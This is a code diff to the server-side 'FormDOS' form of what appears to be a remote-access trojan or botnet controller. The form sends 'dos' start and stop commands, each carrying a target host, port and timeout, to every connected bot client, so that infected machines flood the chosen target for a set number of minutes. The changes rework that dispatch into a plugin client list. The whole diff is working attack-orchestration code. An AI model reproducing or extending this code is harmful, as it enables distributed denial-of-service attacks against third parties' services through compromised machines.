@@ -12,6 +12,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.IO;
 
 namespace Server.Forms
 {
@@ -20,7 +21,9 @@ namespace Server.Forms
         private TimeSpan timespan;
         private Stopwatch stopwatch;
         private string status = "is online";
-        private List<Clients> selectedClients = new List<Clients>();
+        public object sync = new object();
+        public List<Clients> selectedClients = new List<Clients>();
+        public List<Clients> PlguinClients = new List<Clients>();
         public FormDOS()
         {
             InitializeComponent();
@@ -37,74 +40,55 @@ namespace Server.Forms
             }
             catch { return; }
 
-            if (Program.form1.listView1.Items.Count > 0)
+            if (PlguinClients.Count > 0)
             {
-                btnAttack.Enabled = false;
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "dos";
-                msgpack.ForcePathObject("Option").AsString = "postStart";
-                msgpack.ForcePathObject("Host").AsString = txtHost.Text;
-                msgpack.ForcePathObject("Port").AsString = txtPort.Text;
-                msgpack.ForcePathObject("Timeout").AsString = txtTimeout.Text;
-                if (btnAll.Checked)
+                try
                 {
-                    foreach (ListViewItem itm in Program.form1.listView1.Items)
+                    btnAttack.Enabled = false;
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "dos";
+                    msgpack.ForcePathObject("Option").AsString = "postStart";
+                    msgpack.ForcePathObject("Host").AsString = txtHost.Text;
+                    msgpack.ForcePathObject("Port").AsString = txtPort.Text;
+                    msgpack.ForcePathObject("Timeout").AsString = txtTimeout.Text;
+
+                    foreach (Clients clients in PlguinClients)
                     {
-                        Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        selectedClients.Add(clients);
+                        ThreadPool.QueueUserWorkItem(clients.Send, msgpack.Encode2Bytes());
                     }
+
+                    btnStop.Enabled = true;
+                    timespan = TimeSpan.FromSeconds(Convert.ToInt32(txtTimeout.Text) * 60);
+                    stopwatch = new Stopwatch();
+                    stopwatch.Start();
+                    timer1.Start();
+                    timer2.Start();
                 }
-                else
-                {
-                    foreach (ListViewItem itm in Program.form1.listView1.SelectedItems)
-                    {
-                        Clients client = (Clients)itm.Tag;
-                        selectedClients.Add(client);
-                        client.LV.ForeColor = Color.Green;
-                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                    }
-                }
-                btnStop.Enabled = true;
-                btnAll.Enabled = false;
-                btnSelected.Enabled = false;
-                timespan = TimeSpan.FromSeconds(Convert.ToInt32(txtTimeout.Text) * 60);
-                stopwatch = new Stopwatch();
-                stopwatch.Start();
-                timer1.Start();
-                timer2.Start();
+                catch { }
             }
         }
 
         private void BtnStop_Click(object sender, EventArgs e)
         {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "dos";
-            msgpack.ForcePathObject("Option").AsString = "postStop";
-            if (btnAll.Checked)
+            try
             {
-                foreach (ListViewItem itm in Program.form1.listView1.Items)
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "dos";
+                msgpack.ForcePathObject("Option").AsString = "postStop";
+
+                foreach (Clients clients in PlguinClients)
                 {
-                    Clients client = (Clients)itm.Tag;
-                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                }
-            }
-            else
-            {
-                foreach (Clients client in selectedClients.ToList())
-                {
-                    client.LV.ForeColor = Color.Empty;
-                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(clients.Send, msgpack.Encode2Bytes());
                 }
                 selectedClients.Clear();
-                selectedClients = new List<Clients>();
+                btnAttack.Enabled = true;
+                btnStop.Enabled = false;
+                timer1.Stop();
+                timer2.Stop();
+                status = "is online";
             }
-            btnAttack.Enabled = true;
-            btnStop.Enabled = false;
-            btnAll.Enabled = true;
-            btnSelected.Enabled = true;
-            timer1.Stop();
-            timer2.Stop();
-            status = "is online";
+            catch { }
         }
 
         private void Timer1_Tick(object sender, EventArgs e)
@@ -114,8 +98,6 @@ namespace Server.Forms
             {
                 btnAttack.Enabled = true;
                 btnStop.Enabled = false;
-                btnAll.Enabled = true;
-                btnSelected.Enabled = true;
                 timer1.Stop();
                 timer2.Stop();
                 status = "is online";
@@ -139,6 +121,16 @@ namespace Server.Forms
 
         private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
         {
+            try
+            {
+                foreach (Clients clients in PlguinClients)
+                {
+                    clients.Disconnected();
+                }
+                PlguinClients.Clear();
+                selectedClients.Clear();
+            }
+            catch { }
             this.Hide();
             this.Parent = null;
             e.Cancel = true;
